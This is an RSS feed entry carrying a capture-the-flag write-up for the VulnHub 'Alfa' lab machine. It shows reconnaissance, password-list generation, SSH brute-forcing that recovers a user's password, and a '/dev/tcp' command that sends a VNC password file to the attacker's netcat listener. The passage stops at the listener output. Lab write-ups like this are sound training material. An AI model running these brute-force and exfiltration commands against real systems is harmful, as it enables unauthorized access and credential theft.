<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Tunneling on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/tunneling/</link>
    <description>Recent content in Tunneling on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 13 Jun 2021 16:55:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/tunneling/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - Alfa</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</link>
      <pubDate>Sun, 13 Jun 2021 16:55:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</guid>
      <description>Check your browser scrollbar!</description>
      <content:encoded><![CDATA[<p>Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user&rsquo;s pet. Alfa&rsquo;s website has a robots.txt  file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I&rsquo;m able to guess the user&rsquo;s password and gain a foothold on the system. In the user&rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Generating password list</li>
<li>Brute-force FTP and SSH</li>
<li>VNC password decrypt</li>
<li>SSH tunneling</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Hydra</li>
<li>Crackmapexec</li>
<li>FTP client</li>
<li>Gobuster</li>
<li>Brainfuck decoder - <a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li>
<li>VNCviewer</li>
<li>pspy</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
<span style="color:#75715e"># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.109
Host is up <span style="color:#f92672">(</span>0.00056s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">17</span> 13:02 thomas
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style="color:#ae81ff">3</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp  open  http        Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Alfa IT Solutions
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
MAC Address: 08:00:27:9C:8A:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
Service Info: Host: ALFA; OS: Unix

Host script results:
|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
| nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
| Names:
|   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.9.5-Debian<span style="color:#f92672">)</span>
|   Computer name: alfa
|   NetBIOS computer name: ALFA<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   FQDN: alfa
|_  System time: 2021-04-22T08:41:36+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T06:41:36
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p>
<p>Performing a full port scan, discovers the fifth port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-22 02:53 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.109
Host is up <span style="color:#f92672">(</span>0.00040s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65530</span> closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65111/tcp open  unknown
MAC Address: 08:00:27:9C:8A:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 36.32 seconds
           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
</code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc 192.168.2.109 <span style="color:#ae81ff">65111</span>
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ftp 192.168.2.109 
Connected to 192.168.2.109.
<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
Name <span style="color:#f92672">(</span>192.168.2.109:root<span style="color:#f92672">)</span>: anonymous
<span style="color:#ae81ff">331</span> Please specify the password.
Password:
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">17</span> 13:02 thomas
<span style="color:#ae81ff">226</span> Directory send OK.
ftp&gt; cd thomas
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; dir
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">104068</span> Dec <span style="color:#ae81ff">17</span> 12:49 milo.jpg
</code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p>
<p><div class="img-container"><img src="imgs/image-20210613181756997.png" alt="image-20210613181756997"  /></div>
</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous access is allowed but no read permission there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec smb 192.168.2.109 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 <span style="color:#f92672">(</span>name:ALFA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">\A</span>NONYMOUS: 
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             Share           Permissions     Remark
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             -----           -----------     ------
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             print$                          Printer Drivers
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             IPC$                            IPC Service <span style="color:#f92672">(</span>Samba 4.9.5-Debian<span style="color:#f92672">)</span>
</code></pre></div><h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422143723577.png" alt="image-20210422143723577"  /></div>
</p>
<p>Nothing useful on the page source.</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.2.109/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              html,txt,bak
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/04/22 02:46:48 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/js/<span style="color:#f92672">]</span>
/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/images/<span style="color:#f92672">]</span>
/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/css/<span style="color:#f92672">]</span>   
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3870<span style="color:#f92672">]</span>                                  
/fonts                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/fonts/<span style="color:#f92672">]</span> 
/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 459<span style="color:#f92672">]</span>                                   
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span> 
</code></pre></div><h4 id="robotstxt">robots.txt</h4>
<p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p>
<p><div class="img-container"><img src="imgs/image-20210422134810181.png" alt="image-20210422134810181"  /></div>
</p>
<p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ curl -s http://192.168.2.109/robots.txt
/home <span style="color:#75715e">#404</span>
/admin <span style="color:#75715e">#404</span>
/login <span style="color:#75715e">#404</span>
/images <span style="color:#75715e">#200, directory listing, nothing interesting</span>
/cgi-bin <span style="color:#75715e">#404</span>
/intranet <span style="color:#75715e">#404</span>
/wp-admin <span style="color:#75715e">#404</span>
/wp-login <span style="color:#75715e">#404</span>

...&lt;SNIP&gt;...
++++++++++<span style="color:#f92672">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span style="color:#f92672">&lt;&lt;&lt;</span>&lt;-<span style="color:#f92672">]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</code></pre></div><p>The string is translated as <code>/alfa-support</code> on <a href="https://www.dcode.fr/brainfuck-language">site</a>,</p>
<p><div class="img-container"><img src="imgs/image-20210613181246585.png" alt="image-20210613181246585"  /></div>
</p>
<h4 id="alfa-support">/alfa-support</h4>
<p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p>
<p><div class="img-container"><img src="imgs/image-20210422143814423.png" alt="image-20210422143814423"  /></div>
</p>
<p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-thomas">Shell as Thomas</h3>
<h4 id="creating-wordlist">Creating Wordlist</h4>
<p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet.  With <code>bash</code>, I could generate all the possible password used by Thomas.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>000..999<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;milo</span>$i<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span> | tee passwords
milo000
milo001
milo002
milo003
...&lt;snip&gt;...
</code></pre></div><h4 id="brute-force---ftp">Brute force - FTP</h4>
<p>I tried it with Hydra on FTP but returns nothing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> root@iamf «alfa» «192.168.2.103» 
$ hydra -l thomas -P passwords ftp://192.168.2.103 
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2021-04-22 03:43:09
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1000</span> login tries <span style="color:#f92672">(</span>l:1/p:1000<span style="color:#f92672">)</span>, ~63 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ftp://192.168.2.103:21/
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 320.00 tries/min, <span style="color:#ae81ff">320</span> tries in 00:01h, <span style="color:#ae81ff">713</span> to <span style="color:#66d9ef">do</span> in 00:03h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 317.00 tries/min, <span style="color:#ae81ff">634</span> tries in 00:02h, <span style="color:#ae81ff">399</span> to <span style="color:#66d9ef">do</span> in 00:02h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 315.67 tries/min, <span style="color:#ae81ff">947</span> tries in 00:03h, <span style="color:#ae81ff">86</span> to <span style="color:#66d9ef">do</span> in 00:01h, <span style="color:#ae81ff">16</span> active
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target completed, <span style="color:#ae81ff">0</span> valid passwords found
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">15</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">15</span> targets did not resolve or could not be connected
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> targets did not complete
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-04-22 03:46:35
</code></pre></div><h4 id="brute-force---ssh">Brute force - SSH</h4>
<p>This time, I divided the wordlist into two files.</p>
<ul>
<li>passwords1: 000-500</li>
<li>passwords2: 500-999</li>
</ul>
<p>And I&rsquo;ll use <code>crackmapexec</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span style="color:#ae81ff">65111</span>
</code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p>
<p><div class="img-container"><img src="imgs/image-20210422151432013.png" alt="image-20210422151432013"  /></div>
</p>
<h4 id="ssh---thomas">SSH - Thomas</h4>
<p>I&rsquo;ll just log in via SSH and grabs the flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ssh -p <span style="color:#ae81ff">65111</span> thomas@192.168.2.109
thomas@192.168.2.109<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Linux Alfa 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>

<span style="color:#75715e">####################################################################</span>
<span style="color:#75715e">#                  ,---------------------------,                   #</span>
<span style="color:#75715e">#                  |  /---------------------\  |                   #</span>
<span style="color:#75715e">#                  | |                       | |                   #</span>
<span style="color:#75715e">#                  | |         +----+        | |                   #</span>
<span style="color:#75715e">#                  | |         |ALFA|        | |                   #</span>
<span style="color:#75715e">#                  | |         +----+        | |                   #</span>
<span style="color:#75715e">#                  | |                       | |                   #</span>
<span style="color:#75715e">#                  |  \_____________________/  |                   #</span>
<span style="color:#75715e">#                  |___________________________|                   #</span>
<span style="color:#75715e">#                ,---\_____     []     _______/------,             #</span>
<span style="color:#75715e">#              /         /______________\           /|             #</span>
<span style="color:#75715e">#            /___________________________________ /  | ___         #</span>
<span style="color:#75715e">#            |                                   |   |    )        #</span>
<span style="color:#75715e">#            |  _ _ _                 [-------]  |   |   (         #</span>
<span style="color:#75715e">#            |  o o o                 [-------]  |  /    _)_       #</span>
<span style="color:#75715e">#            |__________________________________ |/     /  /       #</span>
<span style="color:#75715e">#        /-------------------------------------/|      ( )/        #</span>
<span style="color:#75715e">#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
<span style="color:#75715e">#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
<span style="color:#75715e">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
<span style="color:#75715e">#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
<span style="color:#75715e">#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
<span style="color:#75715e">#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
<span style="color:#75715e">#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
<span style="color:#75715e">#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
<span style="color:#75715e">#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
<span style="color:#75715e">####################################################################</span>

thomas@Alfa:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span> grupos<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>
thomas@Alfa:~$ ls -l
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">1332</span> dic <span style="color:#ae81ff">20</span> 11:04 user.txt
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>In thomas&rsquo;s home directory,  there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ls -la
total <span style="color:#ae81ff">40</span>
drwxr-xr-x <span style="color:#ae81ff">4</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">20</span> 22:22 .
drwxr-xr-x <span style="color:#ae81ff">3</span> root   root   <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 07:58 ..
-rw------- <span style="color:#ae81ff">1</span> thomas thomas    <span style="color:#ae81ff">4</span> dic <span style="color:#ae81ff">20</span> 22:22 .bash_history
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas  <span style="color:#ae81ff">220</span> dic <span style="color:#ae81ff">16</span> 07:58 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">3526</span> dic <span style="color:#ae81ff">16</span> 07:58 .bashrc
drwx------ <span style="color:#ae81ff">3</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 21:15 .gnupg
drwxr-xr-x <span style="color:#ae81ff">3</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 20:44 .local
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas  <span style="color:#ae81ff">807</span> dic <span style="color:#ae81ff">16</span> 07:58 .profile
-rwxrwxrwx <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">16</span> dic <span style="color:#ae81ff">17</span> 23:35 .remote_secret
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">1332</span> dic <span style="color:#ae81ff">20</span> 11:04 user.txt
</code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret 
�<span style="color:#e6db74">&#34;�Cc�&#34;</span>�Cc
</code></pre></div><p>Running <a href="https://github.com/DominicBreuker/pspy">pspy</a> discovers a VNC server running locally with root access on port 5901.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</code></pre></div><h4 id="vnc-decrypt">VNC Decrypt</h4>
<p>This <code>.remote_secret</code> is a VNC password file and I could use <a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password">HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p>
<p>On Alfa:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; remote_secret
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>192.168.2.103<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.2.109<span style="color:#f92672">]</span> <span style="color:#ae81ff">57532</span>
